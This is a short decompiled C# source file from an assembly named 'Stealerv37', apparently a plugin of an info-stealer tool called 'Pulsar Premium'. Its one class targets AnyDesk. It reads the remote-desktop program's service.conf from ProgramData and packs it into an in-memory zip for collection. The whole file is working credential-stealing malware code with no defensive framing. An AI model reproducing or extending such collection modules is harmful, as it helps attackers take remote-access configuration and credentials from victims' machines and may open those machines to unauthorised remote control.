// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.AnyDesk
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System.IO;

#nullable disable
namespace Intelix.Targets.Applications;

public class AnyDesk : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = "C:\\ProgramData\\AnyDesk\\service.conf";
    if (!File.Exists(path))
      return;
    string entryPath = "AnyDesk\\service.conf";
    counter.Applications.Add(new Counter.CounterApplications()
    {
      Name = nameof (AnyDesk),
      Files = {
        $"{path} => {entryPath}"
      }
    });
    zip.AddFile(entryPath, File.ReadAllBytes(path));
  }
}
